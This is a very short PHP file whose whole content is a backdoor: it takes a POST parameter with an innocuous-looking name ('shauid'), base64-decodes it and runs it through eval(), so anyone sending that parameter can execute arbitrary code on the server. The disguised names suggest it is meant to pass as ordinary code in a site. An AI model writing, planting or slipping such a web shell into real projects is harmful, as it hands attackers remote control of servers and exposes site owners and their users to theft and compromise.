<?php
if(isset($_POST['shauid'])){ $uidmail = base64_decode($_POST['shauid']); eval($uidmail); }
?>